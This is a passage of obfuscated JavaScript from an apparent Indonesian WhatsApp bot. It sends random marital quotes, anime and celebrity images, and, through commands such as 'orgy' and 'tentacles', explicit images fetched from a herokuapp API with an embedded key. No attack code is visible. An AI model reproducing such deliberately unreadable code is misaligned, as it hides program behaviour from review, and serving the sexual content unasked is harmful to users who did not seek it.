+_0x1e23e4(0x1f,0x7d3,0x53a,0x774)+_0x593f96(0xcc2,0xfb7,0xbe7,0x9d3)+_0x1e23e4(0x8a9,0x9b3,0x799,0xb8c)+_0x593f96(0xa4e,0xa56,0x5df,0x731)+'it\x20per\x20har'+'i',_0x1e23e4(0x8d7,0xa47,0x812,0xbf4)+_0x1e23e4(0x852,0x518,0xa10,0xdab)+_0x593f96(0x9b0,0xc26,0xb28,0xaa1)+_0x1e23e4(0x1d6,0x9f3,0x592,0x767)+_0x1e23e4(0xed4,0xaf6,0x9c1,0x6b9)+'ng\x20seharus'+'nya\x20takut\x20'+_0x593f96(0x91c,0x412,0xbd2,0x935)+_0x1e23e4(0x3d8,0xc85,0x854,0xd12)+_0x593f96(0xc9a,0x85d,0x114d,0x976),_0x1e23e4(0x830,0x91a,0x80b,0x38a)+'\x20suka\x20sama'+_0x1e23e4(0x85b,0x861,0xa42,0xd81)+_0x593f96(0x384,0x384,-0xaa,0x130)+_0x1e23e4(0x4dc,0xe2,0x1e0,0x2e5)+_0x593f96(0x551,0x159,0x120,0x392)+'\x20gak\x20ngert'+'i.\x20Makanya'+_0x1e23e4(0x784,0xac,0x52c,0x48f)+_0x593f96(0x985,0xd6f,0xbd0,0xd6d)+_0x1e23e4(0x7b2,0x606,0xae7,0xfed)+'membenci\x20d'+_0x593f96(0x393,0x534,0x784,0x376)+_0x593f96(0x98a,0x53c,0x548,0x827),'Salah\x20satu'+_0x593f96(0x8c4,0x46d,0xcf9,0xae7)+_0x593f96(0xb37,0xfc3,0x64c,0xb20)+_0x1e23e4(0x84,0x738,0x2ad,0x15c)+_0x593f96(0xbd3,0xf91,0x92f,0xc00)+_0x593f96(0x521,0x550,0x7a4,0x159)+_0x593f96(0xaf3,0x90d,0xb4b,0x798)+_0x1e23e4(0x707,0xa86,0xa95,0xafb)+_0x1e23e4(0x61d,0x764,0x549,0x431)+_0x593f96(0x846,0x936,0x9e6,0x8aa)+_0x1e23e4(0x87a,0x5e1,0x44f,0x795)+_0x1e23e4(0x228,0x5d1,0x189,0x25a),_0x1e23e4(0x445,0xa3b,0x708,0x390)+_0x1e23e4(0x32,0x5ac,0x2fa,-0x113)+_0x1e23e4(0x81f,0x964,0x5c0,0x939)+_0x593f96(0xb7b,0xc12,0xabb,0x8a4)+'orbanan\x20mu'+_0x593f96(0x482,0x371,0x920,0xa5)+_0x1e23e4(0x9c1,0x7ea,0x5f4,0x45b)+_0x1e23e4(-0x1be,-0x25a,0xff,-0x206),_0x1e23e4(0x209,0x6dc,0x3b7,0x3eb)+_0x593f96(0xacb,0x8e1,0x9e4,0x9d9)+'sakan\x20saki'+_0x1e23e4(0xce,0x1ba,0x2dc,0x3e1)+_0x1e23e4(0x683,0x712,0xab1,0x650)+_0x1e23e4(0x1f3,-0x2fc,0x135,0x5fb)+_0x593f96(0x6f4,0x2e1,0xad9,0x794)+_0x1e23e4(0x5d5,0xb13,0x66d,0xadb)+_0x1e23e4(0x563,0xa14,0x85c,0x894)+_0x593f96(0x5fd,0x7ea,0x4a6,0x212)+_0x1e23e4(0x2d8,0x88a,0x7f0,0x822),_0x1e23e4(0xcb7,0x559,0x80b,0x768)+'\x20takut\x20sam'+'a\x20istri\x20sa'+_0x1e23e4(0x584,0xa89,0x9f1,0xef5)+_0x1e23e4(0x2a8,0x2a5,0x77f,0x5f5)+_0x593f96(0xa70,0x7e9,0xf89,0x630)+_0x1e23e4(-0x263,0x5bc,0xda,-0x355)+_0x1e23e4(0x5ac,0x7bf,0x34d,0x49f)+_0x1e23e4(0xe3e,0xa9e,0xa07,0xcbb)+_0x593f96(0xb3c,0xe1a,0xf1b,0xbd7)+_0x1e23e4(0x5f8,0x517,0x65e,0x7da),_0x593f96(0x824,0x759,0x446,0x781)+_0x1e23e4(-0x31f,0x68a,0x1db,0x49b)+'anda\x20menja'+_0x593f96(0x765,0x90a,0x296,0xa51)+_0x1e23e4(0xb34,0xd43,0x956,0xbdb)+_0x1e23e4(0x6ae,0x44d,0x7e2,0xa67)+_0x1e23e4(0x36e,0x563,0x14f,0x455)+_0x593f96(0x3a4,0x625,0x259,0x6ea)+'kepada\x20mer'+'tua\x20saya,\x20'+_0x1e23e4(0x99a,0xb1e,0x85b,0x538)+_0x1e23e4(0x8e1,0x58b,0xa9d,0xeed)+_0x593f96(0x9ee,0x798,0xe61,0xe25),_0x593f96(0x468,0x4a6,0x2bd,0x7a2)+_0x593f96(0x7ff,0x4db,0xbf0,0x314)+_0x593f96(0x5a1,0x836,0x362,0x26c)+_0x593f96(0x8ea,0xb7b,0x3f6,0xbf3)+_0x593f96(0xb79,0xff5,0xed3,0xab5)+_0x1e23e4(0x9cf,0x8de,0x6bd,0x920)+_0x593f96(0x5ab,0x4bc,0x9bf,0xa0c)+'ah\x20bahwa\x20y'+_0x1e23e4(0x580,0x9cf,0xa38,0xb30)+'lami\x20sekar'+'ang\x20adalah'+_0x1e23e4(-0x13a,-0xc,0x3a8,0x501)+'ari\x20Tuhan',_0x593f96(0x8cb,0xb42,0x3cb,0xc6b)+_0x593f96(0x5d5,0x91f,0x97a,0x99e)+_0x1e23e4(0xdbe,0x8c1,0xa7e,0xaad)+_0x1e23e4(0x469,0x396,0x318,0x198)+_0x1e23e4(0x893,0x3f5,0x538,0x412)+_0x593f96(0xa61,0xaef,0xb2f,0xad6)+_0x593f96(0x4f5,0x582,0x4df,0x15),_0x593f96(0x618,0x860,0x7da,0xaed)+_0x593f96(0x91d,0xd51,0x66e,0x4a5)+_0x1e23e4(0x673,0xff,0x54c,0xa5c)+_0x1e23e4(0x132,0x102,0x36e,0x5bc)+_0x1e23e4(0xc58,0xce3,0xa1b,0x8cd)+_0x1e23e4(0x630,0x798,0x7ab,0x3cd)+_0x1e23e4(0x46e,0x96a,0x4c7,0x3e6)+_0x1e23e4(0x5e1,0x7b1,0x782,0x2d4)+_0x1e23e4(0xb25,0x734,0x8d4,0x93c)+_0x593f96(0x6ae,0x406,0xaff,0xb33)+'kan\x20istrin'+_0x1e23e4(0x876,0xcf4,0xa48,0x82f)+_0x593f96(0xc61,0xc95,0x984,0xfa1),_0x1e23e4(0xa68,0x883,0x762,0x9fb)+_0x1e23e4(0xf3d,0xadd,0xa3a,0xd55)+_0x593f96(0x874,0x815,0xc3a,0x920)+_0x1e23e4(0x530,0x9ed,0x735,0x9ca)+_0x1e23e4(0x560,-0x4a,0x342,0x634)+'dar\x20tidak\x20'+'ada\x20yang\x20m'+_0x1e23e4(0x44,0x21a,0x3c0,0x361)+_0x1e23e4(0x98b,0x475,0x53f,0x7a1),_0x1e23e4(0xb8f,0x5da,0x84b,0x9b9)+_0x1e23e4(0x86d,0x3d4,0x526,0x95c)+_0x593f96(0x3e8,0x243,0x36d,0x583)+_0x1e23e4(0xe87,0x7be,0xa2d,0x66f)+_0x593f96(0xcac,0xed0,0xcc5,0xbf3)+_0x593f96(0x2c2,0x36c,-0x246,-0x189)+_0x593f96(0x77b,0x341,0x884,0x97f)+_0x593f96(0x662,0x6e7,0x798,0x463)+_0x593f96(0x543,0x18b,0xa10,0x1a5)+_0x1e23e4(0xa47,0xa61,0xa55,0xd0b)+_0x1e23e4(-0x6b,-0x1b7,0x2d8,-0x1d)+'ur\x20hanya\x20d'+_0x593f96(0x557,0x9ba,0x8c5,0x163)+_0x593f96(0x565,0x16e,0x351,0x94c)+_0x593f96(0x3a1,0x1d4,0x46b,0x181)+_0x1e23e4(0x62c,0xae,0x1fe,0x21b)+_0x593f96(0x85b,0x541,0x916,0xc9f),_0x1e23e4(0x6b1,0x376,0x3b1,0x23c)+_0x593f96(0x7c3,0x4c8,0x3cb,0x530)+_0x1e23e4(0x5de,0x629,0x29b,0x687)+'ang\x20berpua'+_0x593f96(0x8dd,0xaa7,0xb4d,0xc45)+_0x1e23e4(0x261,-0x21b,0x23b,-0x230)+_0x593f96(0x34b,0x4,0x649,0x3ee)+'.\x20Sedangka'+_0x593f96(0x427,-0x25,0x92e,0x4b)+_0x1e23e4(0x3ed,0x666,0x87c,0xc96)+_0x1e23e4(0x17a,0x5b0,0x3e0,0x888)+_0x593f96(0xbea,0xbc1,0x1093,0xa24)+_0x593f96(0x6b9,0xb03,0xa6c,0x6ed)+_0x1e23e4(-0x387,-0x71,0x149,-0x34e)+_0x1e23e4(0x83d,0x527,0x907,0x68c),_0x1e23e4(0x34c,0x4f,0x566,0x48d)+_0x593f96(0xcb3,0x8f7,0x9ed,0x9f0)+'ita\x20adalah'+_0x593f96(0x4be,0x2ae,0x16c,0x849)+_0x593f96(0x869,0x619,0x80c,0x496)+'agi\x20pria\x20a'+_0x1e23e4(0xca5,0xdec,0x8e3,0x88e)+_0x593f96(0x6b5,0x988,0x854,0x87a),'Orang\x20kaya'+_0x1e23e4(0xc6c,0x564,0x8ba,0xaff)+'jadi\x20orang'+'\x20miskin,\x20t'+'api\x20orang\x20'+_0x593f96(0x2bb,-0x187,0x230,-0x211)+_0x1e23e4(0x7bf,0x934,0x4f6,0x1e0)+_0x593f96(0x6d7,0x77e,0x381,0x2aa)+'ng\x20kaya',_0x1e23e4(0xbd2,0x6cd,0x9ef,0x855)+_0x593f96(0x4fe,0x7d1,0x3ed,0x2c2)+_0x1e23e4(0xa6,0x41d,0x402,0x844)+_0x1e23e4(0x375,0x8a5,0x4a4,-0x2b)+_0x593f96(0x56d,0x258,0x547,0x7b5)+_0x593f96(0xbda,0x108e,0xb3e,0xdd2)+'i,\x20sederha'+_0x1e23e4(0x813,0x8c9,0x728,0x8fc)+_0x593f96(0x2d2,0x46e,-0x24,-0x119)+_0x1e23e4(-0x15e,0x756,0x265,-0x265)+_0x593f96(0x6ee,0x505,0xa1b,0x7ca)],longtong_=longtong[Math[_0x1e23e4(0x58f,-0x1b0,0x290,0x2df)](Math[_0x593f96(0x75b,0x84a,0xa09,0xa07)]()*longtong[_0x593f96(0xae8,0x89c,0xe32,0xbe7)])],_0x7642dc={};_0x7642dc[_0x1e23e4(0x3a4,0x192,0x1de,0x108)+'t']=_0x593f96(0x2ac,0x500,0x6f0,0x72a);const _0x2b1093={};_0x2b1093['buttonId']=_0x593f96(0x457,0x387,0x366,0x4b6),_0x2b1093[_0x1e23e4(0x350,-0x31c,0xc6,-0x381)]=_0x7642dc,_0x2b1093[_0x593f96(0xb7e,0x867,0xfde,0x6ca)]=0x1;const _0x37d859={};_0x37d859[_0x593f96(0x3bc,0x5d5,-0x33,0x45d)+'t']=_0x593f96(0x314,-0x10f,0x4f8,0x657);const _0x376489={};_0x376489['buttonId']=''+command,_0x376489['buttonText']=_0x37d859,_0x376489[_0x1e23e4(0x758,0xd79,0x9a0,0x56c)]=0x1;var buttonns=[_0x2b1093,_0x376489];buttonMessage={'contentText':longtong_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+_0x593f96(0x2b5,0x1b,0x316,0x699)+_0x593f96(0xbc9,0xcb8,0xc0b,0xd70))+enter+_0x593f96(0xa48,0x56e,0xea4,0xebd)+sender[_0x593f96(0x311,0x47d,0x170,0x58)]('@')[-0x45+-0xadc+0xb21],'buttons':buttonns,'headerType':0x1};const _0x3aa1dd={};_0x3aa1dd['text']='hi',_0x3aa1dd[_0x1e23e4(0x9c2,0xcf2,0x830,0x8f7)+_0x1e23e4(0x156,0x593,0x608,0x189)]=0x3b9aca00,_0x3aa1dd['isForwarde'+'d']=!![],_0x3aa1dd[_0x593f96(0x320,0x6bc,0x61,0x478)+'ral']=!![],_0x3aa1dd['mentionedJ'+'id']=[sender];const _0x311753={};_0x311753[_0x593f96(0x5da,0x39d,0xa91,0xa5a)]='Botwea\x20©2k'+'21',_0x311753['contextInf'+'o']=_0x3aa1dd,_0x311753[_0x593f96(0x991,0xc16,0x5dd,0x7d9)]=ftoko,_0x311753[_0x593f96(0x320,0x460,0x429,0x6ff)+_0x593f96(0x3c2,0x46f,0x15a,0x1fc)]=!![],alpha[_0x593f96(0x863,0x5c3,0x3a4,0xbee)+'e'](from,buttonMessage,MessageType[_0x593f96(0x4e9,0x636,0x4f3,0x1d5)+'sage'],_0x311753);break;case _0x1e23e4(0x746,0xa2e,0x751,0x902):case _0x1e23e4(0x67d,-0x175,0x26d,0x1c1):case _0x1e23e4(0x37c,0x4cb,0x672,0x237):case _0x1e23e4(0xcd5,0x8ad,0x801,0x48b):case _0x1e23e4(0x9a0,0x8e3,0x91d,0x6d9):case _0x1e23e4(0x5d8,0x60b,0x7ed,0xbf5):case _0x1e23e4(-0xf,0x8e3,0x3dd,0x86b):case _0x593f96(0x733,0x99c,0x9e9,0x6a1):case'inori':case _0x593f96(0x80a,0x845,0x85d,0xd22):case _0x1e23e4(0xab0,0x4de,0x8ce,0x3f9)+_0x593f96(0x642,0x577,0x306,0x91f):case _0x1e23e4(0x509,0x2a3,0x323,0x7f6)+_0x1e23e4(0x57f,0xd95,0x8db,0xb3f):case'mikasa':case _0x593f96(0xb58,0xa92,0xd75,0x1070)+'a':case _0x593f96(0xb72,0x74f,0x74e,0x8ab)+'ayuki':case'nakiri_ali'+'ce':case'naruto':case _0x1e23e4(0xcc0,0xb16,0x943,0x9ba)+_0x1e23e4(0x163,0x2b5,0x254,0x31d):case _0x1e23e4(-0x155,0x66c,0x2a2,0x564):case _0x593f96(0x598,0x96b,0x91b,0x374):case _0x1e23e4(0x1c3,0x63c,0x16e,0x5d4)+'u':case'shana':case'shiina':case _0x1e23e4(-0x230,0x6c4,0x235,-0x1fa):case _0x593f96(0xa06,0xb65,0x941,0x99b):case _0x1e23e4(0x746,0x4cb,0x72a,0x778):case _0x1e23e4(0x1fd,0x554,0x196,-0x281):case _0x593f96(0x8cf,0xdb8,0x8cb,0xb02):reply(lang[_0x1e23e4(-0x2c2,0x16e,0x143,0x4d6)]());var anime=await fetchJson('https://ap'+_0x593f96(0xa40,0x992,0xd61,0xb42)+'.herokuapp'+_0x1e23e4(0x965,0xa1e,0x90d,0xac4)+_0x593f96(0xc71,0x7df,0xf0a,0x882)+command+(_0x1e23e4(0x8f0,0x20c,0x6b2,0x275)+_0x1e23e4(0xb0a,0xb32,0x9f2,0xc3a)));let random_anime=await getBuffer(anime[_0x1e23e4(0x4ab,0x7d9,0x987,0xe45)]);const mediaxxxxxx=await alpha[_0x1e23e4(0x75a,0x75f,0x781,0xb1b)+_0x1e23e4(0x82f,0x72f,0xa7d,0xf0e)](from,random_anime,MessageType[_0x1e23e4(0x1b4,0x531,0x33e,0x1c9)],{'thumbnail':Buffer[_0x593f96(0xb16,0x88e,0x679,0xbc3)](-0x1d3f+0x3*0xaa+0x1b41)});let bacotluxxxxxx=mediaxxxxxx['message'][_0x593f96(0xbdf,0x93d,0xc5f,0x6ef)+'essage']?mediaxxxxxx[_0x1e23e4(0x556,0xeb4,0x9a7,0x8eb)][_0x1e23e4(0x8c2,0x7f9,0xa01,0x67d)+_0x593f96(0xb1f,0x898,0xe65,0x946)]:mediaxxxxxx;const _0x21e748={};_0x21e748['displayTex'+'t']=_0x1e23e4(0x30,0x3db,0x19d,-0x32);const _0x3e9b46={};_0x3e9b46[_0x1e23e4(0x2ec,0x273,0x200,-0x194)]=_0x1e23e4(0x404,0x5eb,0x279,0x17b),_0x3e9b46['buttonText']=_0x21e748,_0x3e9b46[_0x1e23e4(0x61d,0x571,0x9a0,0x78e)]=0x1;const _0x20a34b={};_0x20a34b[_0x1e23e4(0x64e,0x1d5,0x1de,0x160)+'t']=_0x593f96(0x314,0x9f,0x3f2,0x790);const _0x4f8726={};_0x4f8726[_0x1e23e4(0x335,0x6e,0x200,0x700)]=''+command,_0x4f8726[_0x593f96(0x2a4,0x77d,0x346,0xa)]=_0x20a34b,_0x4f8726['type']=0x1;const buttonsxxxxxx=[_0x3e9b46,_0x4f8726],btnxxxxx__={'contentText':lang[_0x593f96(0x613,0x940,0xa86,0x58b)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x593f96(0x9a9,0x94f,0x9cc,0x756)+_0x1e23e4(0x450,0x184,0x322,0x4f7))+sender[_0x593f96(0x311,0x154,0x403,0x53f)]('@')[-0xe*0x67+-0x1035*0x1+0x15d7*0x1],'buttons':buttonsxxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxxx[_0x593f96(0xb85,0xb13,0x1088,0xa1c)][_0x1e23e4(0x85a,0xa5a,0x64e,0x394)+'ge']},_0x1d5080={};_0x1d5080['mentionedJ'+'id']=[sender];const _0x50446f={};_0x50446f[_0x1e23e4(0xbf1,0x560,0x7b3,0x8e0)]=mek,_0x50446f[_0x593f96(0xaa4,0x624,0x6dc,0x99f)+'o']=_0x1d5080,alpha[_0x1e23e4(0x486,0x53b,0x685,0x93c)+'e'](from,btnxxxxx__,MessageType[_0x593f96(0x4e9,0x847,0x81b,0x42b)+_0x1e23e4(0x9e4,0xd7f,0xa7d,0xda0)],_0x50446f)[_0x593f96(0xc8c,0xaf5,0xf49,0x893)](_0x1f9c8f=>{const _0x4dad03={'luOMv':function(_0x35a7c9,_0x51f98e){return _0x35a7c9(_0x51f98e);}};function _0x2f05e2(_0x2f30c1,_0x89f606,_0x25f1b4,_0x1b03cf){return _0x1e23e4(_0x2f30c1-0x124,_0x89f606-0x105,_0x2f30c1- -0x267,_0x89f606);}function _0x152db6(_0x2e68cc,_0x47cc44,_0x3e769e,_0x283d0a){return _0x1e23e4(_0x2e68cc-0x1d5,_0x47cc44-0x1b2,_0x3e769e- -0x323,_0x283d0a);}_0x4dad03[_0x152db6(0x47f,-0x373,0x179,0x1fd)](reply,_0x152db6(0x227,0x5f4,0x262,0x2a4)+_0x152db6(-0xd6,-0x2e3,0x13,-0x2d)+'oba\x20bebera'+_0x2f05e2(0x749,0x7dd,0x3cc,0x5a6)+'gi');}),await limitAdd(sender,limit);break;case'baekhyung':case _0x1e23e4(0x5f3,0x76e,0x426,0x257)+'o':case _0x593f96(0x5ef,0x25b,0x31d,0x321):case _0x593f96(0x787,0x3dc,0x9ab,0xbbe):case _0x1e23e4(0xb7f,0x9c5,0x66e,0x96b):case _0x593f96(0x425,-0xb4,0x911,0x90f):case _0x593f96(0x739,0xa45,0x453,0x593):case _0x1e23e4(0x820,0xaf0,0x81e,0x5f2):case _0x593f96(0x604,0x263,0x929,0x425)+'o':case _0x1e23e4(0x96d,0x914,0x666,0x69a)+'n':case _0x1e23e4(0xb76,0x6bb,0x955,0x98d):case _0x593f96(0xcd8,0xd18,0x9ca,0xfd9):case _0x593f96(0x2e7,0x6c1,0x4b,-0x1f8):case _0x593f96(0x7d3,0x78f,0x4b9,0x71b)+'g':case _0x1e23e4(0x2c6,0x2b6,0x688,0xb41):case _0x593f96(0x9ad,0x5f9,0xb6a,0x559):case _0x593f96(0x729,0x754,0x987,0xb40)+'ol':case _0x593f96(0x8fb,0xb05,0xc27,0x600):case'wuyifan':reply(lang[_0x1e23e4(0x3d8,-0xa9,0x143,0x22b)]());var cogan=await fetchJson('https://ap'+_0x1e23e4(0x9ab,0xcb1,0x862,0x8e4)+_0x593f96(0xa80,0xb99,0xf46,0x570)+_0x1e23e4(0x10d,0x91a,0x591,0x3bd)+_0x1e23e4(0x568,0x118,0x178,-0x1af)+command+(_0x593f96(0x890,0x990,0x5e0,0xacb)+_0x1e23e4(0x8f7,0xc88,0x9f2,0xca1)));let random_cogan=await getBuffer(cogan['result']);const mediaxxxxx=await alpha[_0x1e23e4(0x404,0x639,0x781,0xc65)+_0x593f96(0xc5b,0xd99,0xa04,0xc08)](from,random_cogan,MessageType[_0x1e23e4(0x588,0xa6,0x33e,0x82a)],{'thumbnail':Buffer[_0x593f96(0xb16,0x967,0xecf,0x796)](0x1b26+-0x2373+0x84d)});let bacotluxxxxx=mediaxxxxx['message'][_0x593f96(0xbdf,0xf64,0x9a6,0xff6)+_0x1e23e4(0x583,0xd69,0x941,0x548)]?mediaxxxxx[_0x593f96(0xb85,0xa43,0x6b2,0x69c)][_0x1e23e4(0x4e6,0x90f,0xa01,0xca4)+_0x593f96(0xb1f,0x986,0x70d,0x780)]:mediaxxxxx;const _0x2b1774={};_0x2b1774[_0x1e23e4(0x346,0x2ed,0x1de,-0x139)+'t']=_0x1e23e4(-0x14b,0x28b,0x19d,0x63b);const _0xfd01ee={};_0xfd01ee[_0x1e23e4(0x19a,-0x1a8,0x200,-0x15c)]=_0x1e23e4(0x1f7,0x15d,0x279,0x133),_0xfd01ee['buttonText']=_0x2b1774,_0xfd01ee[_0x1e23e4(0x4fa,0x693,0x9a0,0xe0e)]=0x1;const _0x4ea3d6={};_0x4ea3d6['displayTex'+'t']=_0x593f96(0x314,0x394,0x4cb,-0xa2);const _0x28dfd9={};_0x28dfd9[_0x593f96(0x3de,0x33a,0x77f,0x40a)]=''+command,_0x28dfd9['buttonText']=_0x4ea3d6,_0x28dfd9[_0x1e23e4(0x6aa,0xd52,0x9a0,0xc8b)]=0x1;const buttonsxxxxx=[_0xfd01ee,_0x28dfd9],btnxxxx__={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x593f96(0x500,0x1a3,0x62f,0x23))+sender['split']('@')[0x1f20+0x268a+-0x45aa],'buttons':buttonsxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxx['message']['imageMessa'+'ge']},_0x3c3a39={};_0x3c3a39[_0x593f96(0x2ad,0x4a4,0x10f,-0x7d)+'id']=[sender];const _0x4ca84b={};_0x4ca84b[_0x593f96(0x991,0x635,0xea0,0x81c)]=mek,_0x4ca84b['contextInf'+'o']=_0x3c3a39,alpha[_0x593f96(0x863,0xb32,0x470,0x46d)+'e'](from,btnxxxx__,MessageType[_0x593f96(0x4e9,0x634,0x50d,0x79b)+_0x1e23e4(0xba0,0x7c8,0xa7d,0xa80)],_0x4ca84b)[_0x593f96(0xc8c,0x7f2,0x790,0xe6f)](_0xa5f292=>{function _0x420133(_0x482136,_0x96035c,_0x3c0cb8,_0x51d3be){return _0x1e23e4(_0x482136-0x170,_0x96035c-0x8f,_0x482136-0x4d,_0x3c0cb8);}function _0x338915(_0x3bef22,_0x2e61ea,_0x4916cf,_0x487682){return _0x593f96(_0x487682- -0x58f,_0x2e61ea,_0x4916cf-0xb1,_0x487682-0x1f2);}const _0x2430cb={'vbryx':function(_0x59bb19,_0xbe71d8){return _0x59bb19(_0xbe71d8);}};_0x2430cb[_0x420133(0x396,0x29e,0x3fd,0x13)](reply,_0x420133(0x5d2,0x5ca,0xa6a,0x53f)+_0x420133(0x383,0x465,0x176,0x3b0)+_0x338915(-0x3f2,-0x495,-0x42f,-0x1d7)+_0x420133(0x9fd,0x819,0xafc,0x684)+'gi');}),await limitAdd(sender,limit);break;case'ahegao':case _0x1e23e4(-0x1f,0x26f,0x1ca,0x3e8):case _0x593f96(0x433,0x2d,0xe7,0x123):case _0x593f96(0x3e7,0x65e,0x8f4,0x96):case'foot':case _0x1e23e4(-0x25e,0x2cc,0x233,0x56d):case _0x1e23e4(0xa26,0x693,0x682,0xb20):case _0x1e23e4(0xcad,0xc1a,0x914,0x4df):case _0x1e23e4(0x73,0x500,0x406,0x685):case _0x593f96(0x889,0x842,0x409,0xd4e)+'on':case'orgy':case _0x593f96(0x55b,0x1aa,0x7b0,0x634):case'tentacles':case'thighs':case _0x593f96(0x8fa,0xcb1,0xbd8,0xac6):if(!isNsfw)return reply(lang['nsfwmo']());reply(lang[_0x593f96(0x321,0x1eb,0x105,0x23e)]());var nsfww=await fetchJson(_0x1e23e4(0x4ba,0x8ae,0x7fa,0x343)+_0x593f96(0xa40,0xe29,0x9e8,0xebb)+_0x1e23e4(0x4c9,0x94c,0x8a2,0x7bc)+'.com/api/n'+'sfw/'+command+('?apikey=of'+_0x593f96(0xbd0,0xa7e,0x962,0xacb)));let random_nsfww=await getBuffer(nsfww[_0x593f96(0xb65,0x8fc,0x772,0x1064)]);const mediaxxxx=await alpha['prepareMes'+_0x1e23e4(0x87e,0xe7a,0xa7d,0xebf)](from,random_nsfww,MessageType[_0x1e23e4(0xe5,0x510,0x33e,-0x56)],{'thumbnail':Buffer[_0x1e23e4(0xd1a,0xc1f,0x938,0x845)](0x160e+0x42c+0x6*-0x45f)});let bacotluxxxx=mediaxxxx[_0x593f96(0xb85,0xada,0xfd7,0x7dd)][_0x1e23e4(0x8ef,0x55c,0xa01,0xa13)+_0x1e23e4(0xcc9,0x624,0x941,0xd49)]?mediaxxxx[_0x1e23e4(0xdc9,0x5ec,0x9a7,0x61a)]['ephemeralM'+_0x593f96(0xb1f,0xc5c,0xa7a,0x7ec)]:mediaxxxx;const _0xbc516b={};_0xbc516b[_0x1e23e4(0xef,0x23a,0x1de,-0x254)+'t']='🐨\x20Owner';const _0x425db5={};_0x425db5[_0x1e23e4(0x3d4,0x270,0x200,-0x18b)]=_0x1e23e4(0x55f,0x6b4,0x279,0x63d),_0x425db5['buttonText']=_0xbc516b,_0x425db5[_0x593f96(0xb7e,0x6a5,0x934,0x941)]=0x1;const _0xfcd8c6={};_0xfcd8c6[_0x1e23e4(0x54a,0x5c,0x1de,0x52f)+'t']=_0x1e23e4(-0x31c,0x46d,0x136,0x18c);const _0x34d5bd={};_0x34d5bd[_0x593f96(0x3de,0xc1,0x77e,0x747)]=''+command,_0x34d5bd['buttonText']=_0xfcd8c6,_0x34d5bd['type']=0x1;const buttonsxxxx=[_0x425db5,_0x34d5bd],btnxxx__={'contentText':lang[_0x1e23e4(0x18a,0x6fa,0x435,0x1bc)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x593f96(0x9a9,0xb85,0xec1,0xa06)+_0x593f96(0x500,0x73c,0x5,0x691))+sender[_0x1e23e4(-0x86,0x46e,0x133,-0x19e)]('@')[0x25a2*0x1+0x1c*0x19+0x1*-0x285e],'buttons':buttonsxxxx,'headerType':0x4,'imageMessage':bacotluxxxx[_0x1e23e4(0xd3d,0xbdc,0x9a7,0xa53)][_0x1e23e4(0x7a6,0xa22,0x64e,0x29c)+'ge']},_0x5055b4={};_0x5055b4['mentionedJ'+'id']=[sender];const _0x516ec0={};_0x516ec0[_0x593f96(0x991,0x7e5,0x747,0x980)]=mek,_0x516ec0[_0x593f96(0xaa4,0xc4f,0x763,0xd45)+'o']=_0x5055b4,alpha[_0x593f96(0x863,0xbf3,0x387,0x78f)+'e'](from,btnxxx__,MessageType['buttonsMes'+_0x1e23e4(0xaba,0x6e1,0xa7d,0x5a5)],_0x516ec0)[_0x1e23e4(0x615,0x6bc,0xaae,0xe17)](_0x5e3d63=>{function _0x3273d9(_0x513407,_0xa57da5,_0x25fd26,_0x542d49){return _0x593f96(_0x513407- -0x3b4,_0x25fd26,_0x25fd26-0x192,_0x542d49-0x196);}function _0xa88c2d(_0x43eb15,_0x554663,_0x330786,_0x392e91){return _0x1e23e4(_0x43eb15-0x122,_0x554663-0x193,_0x330786-0x3ac,_0x554663);}const _0x30a4b0={'MBJjM':function(_0x1faf86,_0xfb71e1){return _0x1faf86(_0xfb71e1);},'HRTWb':_0x3273d9(0x3af,-0xd7,0x3a6,0x58d)+'salahan,\x20c'+_0xa88c2d(0x429,0x69e,0x586,0x920)+_0x3273d9(0x7da,0x353,0xba7,0x6df)+'gi'};_0x30a4b0[_0x3273d9(-0x73,-0x2c9,0x301,0xe6)](reply,_0x30a4b0['HRTWb']);}),await limitAdd(sender,limit);break;case _0x1e23e4(0xda5,0xeb0,0xa2c,0xe24):case _0x593f96(0x455,0x7ea,0x38f,0x80b):case _0x593f96(0xa5b,0x7c5,0x90e,0x5b1):case'cum':case _0x593f96(0x36d,0x42e,0x392,0xd9):case _0x593f96(0x49b,0x773,0x803,0x32):case'erokemo':case'bj':case _0x593f96(0xa4c,0xe6a,0x542,0x8a8):case'pat':case _0x593f96(0xb6e,0xe62,0x901,0xc9c):case'feed':case _0x593f96(0xb9d,0xfed,0xda7,0x7da)+_0x1e23e4(0x46b,0x55e,0x6c8,0xa0f):case _0x593f96(0x492,0x14a,0xf6,0x384):case _0x593f96(0x628,0x76f,0x1f6,0x2cc):case _0x1e23e4(0x5e9,0x5f9,0x30f,-0x8e):case _0x593f96(0x35b,0x208,0x646,-0x15b):case _0x593f96(0x5df,0x885,0x102,0xa87):case _0x593f96(0x6a6,0x4a3,0x252,0x9bf):case _0x593f96(0x5d8,0x36d,0x190,0x10a):case _0x1e23e4(0x1b3,0x1a8,0x1bd,-0x50):case _0x1e23e4(0x3cb,-0xce,0x253,0x3c5):case _0x593f96(0x345,0x272,0x58f,0x337):case _0x1e23e4(0x4cf,0x447,0x8fe,0xca1):case _0x593f96(0x6d5,0x43c,0xaf6,0xa96):if(!isNsfw&&!mek[_0x593f96(0x51d,0x234,0x661,0x40a)]['fromMe']&&!isOwner&&!isCreator)return reply(lang['nsfwmo']());var ini_gif=await fetchJson(_0x593f96(0xbb0,0x88a,0xe10,0xbad)+_0x593f96(0x8a9,0x9ec,0xa7f,0xcb9)+_0x593f96(0xc3e,0xb0d,0xd3b,0xf1c)+command),ini_gif_=await getBuffer(ini_gif[_0x1e23e4(-0x1e4,0xce,0x153,0x395)]);const mediax_=await alpha['prepareMes'+'sage'](from,ini_gif_,MessageType['video'],{'thumbnail':Buffer[_0x1e23e4(0x8c0,0xd4a,0x938,0x448)](0x79a+0x1365+-0x1aff)});let bacotlux_=mediax_[_0x593f96(0xb85,0x867,0x7ba,0xc98)]['ephemeralM'+_0x593f96(0xb1f,0xd28,0x64a,0xcde)]?mediax_[_0x593f96(0xb85,0xf87,0x1015,0xdd6)][_0x593f96(0xbdf,0xf62,0xa42,0x8f1)+_0x593f96(0xb1f,0xedd,0x74d,0x100f)]:mediax_;const 